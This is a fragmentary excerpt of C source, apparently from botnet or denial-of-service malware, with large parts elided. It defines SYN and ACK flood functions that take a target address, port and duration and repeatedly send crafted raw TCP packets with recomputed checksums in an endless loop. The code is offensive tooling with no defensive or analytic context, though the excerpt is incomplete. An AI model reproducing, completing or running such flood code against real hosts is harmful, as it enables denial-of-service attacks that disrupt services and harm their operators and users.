...
void synflood(sock_t * sp, unsigned int dest_addr,
unsigned short dest_port, int ntime)
{
	...
	unsigned int syn[20] =
	    { 2, 4, 5, 180, 4, 2, 8, 10, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 0 },
	    a = 0;
	...
	while (1) 
	{
		...
		send_tcp.ip.check =
		    in_cksum((unsigned short *)&send_tcp.ip, 20);
		check = rand();
		...
		send_tcp.tcp.check =
		    in_cksum((unsigned short *)&pseudo_header, 32 + psize);
...
void ngsynflood(sock_t * sp, unsigned int dest_addr,
unsigned short dest_port, int ntime)
{
	struct send_tcp send_tcp;
	struct pseudo_header pseudo_header;
...
void ackflood(sock_t * sp, unsigned int dest_addr,
unsigned short dest_port, int ntime)
{
	struct send_tcp send_tcp;
	struct pseudo_header pseudo_header;
...
void ngackflood(sock_t * sp, unsigned int dest_addr,
unsigned short dest_port, int ntime)
{
	struct send_tcp send_tcp;
	struct pseudo_header pseudo_header;
